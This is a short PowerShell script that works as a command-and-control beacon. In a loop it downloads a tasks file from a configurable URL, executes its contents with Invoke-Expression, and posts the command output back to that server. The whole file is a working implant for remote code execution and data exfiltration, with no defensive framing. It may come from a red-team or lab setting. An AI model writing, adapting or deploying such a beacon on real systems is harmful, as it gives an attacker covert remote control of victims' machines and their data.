
param(
    [Parameter(Mandatory=$true)]
    [String] $url = "http://127.0.0.1:8888",

    [Int] $interval = 10
)
function Send-ExecuteResults{
    param(
        [Parameter(Mandatory=$true)]
        [String] $tasks
    )

    if ($tasks){
        try {
            $results = Invoke-Expression $tasks
        } catch {
            $results = ""
        }
        $body = [System.Text.Encoding]::UTF8.GetBytes($($results -join "`n"))
        $response = Invoke-WebRequest -Method Post -Uri $url -Body $body -ContentType "application/text"
        Write-Output "[$(Get-Date)] StatusCode: $($response.StatusCode)"
    }
}

function Start-Beacon {
    Write-Output "[$(Get-Date)] Beacon starting "
    Write-Output "[$(Get-Date)] URL: $url/tasks.txt"

    while ($true) {
        try {
            $response = Invoke-WebRequest -Uri $($url + "/tasks.txt") -UseBasicParsing
            $tasks = $response.Content
            Write-Output "[$(Get-Date)] Tasks: `n$tasks"
            Send-ExecuteResults $tasks
        }
        catch {
            Write-Output "[$(Get-Date) ] Failed to access: $url -Error: $_"
            continue
        }finally{
            Start-Sleep -Seconds $interval
        }
    }
}

Start-Beacon